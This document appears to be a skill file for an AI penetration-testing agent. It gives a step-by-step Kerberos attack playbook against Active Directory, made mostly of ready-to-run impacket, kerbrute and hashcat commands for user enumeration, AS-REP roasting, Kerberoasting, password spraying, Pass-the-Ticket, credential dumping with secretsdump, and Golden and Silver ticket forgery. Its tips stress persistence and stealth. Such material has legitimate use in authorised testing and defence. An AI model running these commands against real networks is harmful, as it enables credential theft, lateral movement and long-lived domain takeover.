<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: kerberos
description: Kerberos attack techniques — AS-REP Roasting, Kerberoasting, Pass-the-Ticket, Golden/Silver Ticket, Overpass-the-Hash using impacket and kerbrute in Kali Linux
---

# Kerberos Attacks

Kerberos = Windows/AD authentication protocol. Attack surface: AS-REP Roasting (no pre-auth), Kerberoasting (service tickets crackable offline), ticket forging (Golden/Silver), Pass-the-Ticket.

**Install:**
```
pip install impacket --break-system-packages
sudo apt-get install -y impacket-scripts krb5-user
# kerbrute: go install github.com/ropnop/kerbrute@latest
# OR: wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 -O /usr/local/bin/kerbrute && chmod +x /usr/local/bin/kerbrute
```

**Port:** 88/TCP+UDP (KDC), 464 (kpasswd)

---

## Reconnaissance

    nmap -p 88 <dc_ip> -sV --open
    # Kerberos on port 88 = Domain Controller

    # Enumerate users (no credentials needed, if pre-auth disabled):
    kerbrute userenum --dc <dc_ip> -d domain.local /usr/share/seclists/Usernames/top-usernames-shortlist.txt
    kerbrute userenum --dc <dc_ip> -d domain.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

---

## AS-REP Roasting (No Pre-Auth Required)

Accounts with "Do not require Kerberos preauthentication" = hash crackable offline:

    # With user list (no credentials):
    GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -dc-ip <dc_ip>
    GetNPUsers.py domain.local/ -usersfile users.txt -format john -dc-ip <dc_ip>

    # With credentials (enumerate vulnerable accounts):
    GetNPUsers.py domain.local/username:password -request -format hashcat -dc-ip <dc_ip>
    GetNPUsers.py 'domain.local/' -usersfile users.txt -no-pass -dc-ip <dc_ip>

    # Output: $krb5asrep$23$user@domain.local:... → crack with hashcat
    hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
    john asrep_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

---

## Kerberoasting (Service Account Ticket Cracking)

Any authenticated user can request TGS tickets for services → crack offline:

    # With valid domain credentials:
    GetUserSPNs.py domain.local/username:password -dc-ip <dc_ip> -request
    GetUserSPNs.py domain.local/username:password -dc-ip <dc_ip> -request -outputfile kerberoast.txt

    # With hash (PTH):
    GetUserSPNs.py domain.local/username -hashes :<NTLM_hash> -dc-ip <dc_ip> -request

    # Crack the TGS ticket:
    hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
    hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
    john kerberoast.txt --wordlist=/usr/share/wordlists/rockyou.txt

---

## Pass-the-Ticket (PTT)

Use a stolen Kerberos ticket without knowing the password:

    # Dump tickets on Windows machine (from Mimikatz or secretsdump):
    # secretsdump.py can dump from LSASS
    secretsdump.py domain/username:password@<target>

    # Export ticket from ccache (Linux):
    export KRB5CCNAME=/path/to/ticket.ccache

    # Use with impacket tools:
    wmiexec.py -k -no-pass domain.local/administrator@<target>
    smbexec.py -k -no-pass domain.local/administrator@<target>
    psexec.py -k -no-pass domain.local/administrator@<target>

---

## Overpass-the-Hash (Pass-the-Key)

Convert NTLM hash to Kerberos ticket:

    # Get TGT using NTLM hash:
    getTGT.py domain.local/username -hashes :<NTLM_hash> -dc-ip <dc_ip>
    # Creates: username.ccache

    export KRB5CCNAME=username.ccache
    wmiexec.py -k -no-pass domain.local/username@<target>

---

## Golden Ticket Attack

Forge unlimited TGTs using krbtgt hash (requires DA privs to get krbtgt hash):

    # Step 1: Get krbtgt NTLM hash (requires Domain Admin):
    secretsdump.py domain/Administrator:password@<dc_ip>
    # krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<krbtgt_NTLM_hash>:::

    # Step 2: Get domain SID:
    lookupsid.py domain/username:password@<dc_ip> | grep "Domain SID"
    # S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX

    # Step 3: Create golden ticket:
    ticketer.py -nthash <krbtgt_NTLM> -domain-sid S-1-5-21-xxx -domain domain.local Administrator
    # Creates: Administrator.ccache

    # Step 4: Use ticket:
    export KRB5CCNAME=Administrator.ccache
    psexec.py -k -no-pass Administrator@<any_dc_or_machine>

---

## Silver Ticket Attack

Forge TGS for a specific service (doesn't need krbtgt — uses service account hash):

    # Need: service account NTLM hash, domain SID, SPN
    ticketer.py -nthash <service_NTLM> -domain-sid S-1-5-21-xxx -domain domain.local \
      -spn cifs/<server>.domain.local Administrator
    # Access specific service (CIFS = file share):
    export KRB5CCNAME=Administrator.ccache
    smbclient.py -k -no-pass //server.domain.local/C$

---

## Password Spraying via Kerberos

    # kerbrute passwordspray — faster than LDAP, avoids some lockout policies:
    kerbrute passwordspray --dc <dc_ip> -d domain.local users.txt 'Password123!'
    kerbrute bruteuser --dc <dc_ip> -d domain.local -P /usr/share/wordlists/rockyou.txt username

---

## Kerberos Reconnaissance (No Creds)

    # Find DC via DNS:
    dig _ldap._tcp.dc._msdcs.domain.local SRV
    dig _kerberos._tcp.domain.local SRV

    # Enumerate with impacket (anonymous):
    lookupsid.py domain.local/guest@<dc_ip>       # SID enumeration

---

## Pro Tips

1. AS-REP Roasting needs NO credentials — just a user list → run `kerbrute userenum` first
2. Kerberoasting requires any valid domain account — service accounts with weak passwords = DA path
3. hashcat `-m 18200` = AS-REP, `-m 13100` = TGS/Kerberoast — don't mix them
4. Golden ticket = persistence for 10 years (default lifetime) even after password change
5. Silver ticket is stealthier than golden — only touches the target service, not the DC
6. `/etc/krb5.conf` must have correct realm and kdc for kerbrute/impacket to work on Linux
7. `GetUserSPNs.py` lists all SPNs first, then add `-request` to get crackable tickets

## Summary

Kerberos attacks: `kerbrute userenum` → `GetNPUsers.py` AS-REP (no creds) → `GetUserSPNs.py` Kerberoast (any domain user) → crack with `hashcat` → with DA: `secretsdump.py` krbtgt hash → `ticketer.py` Golden Ticket → persistent DC access. Most impactful AD attack path after initial foothold.
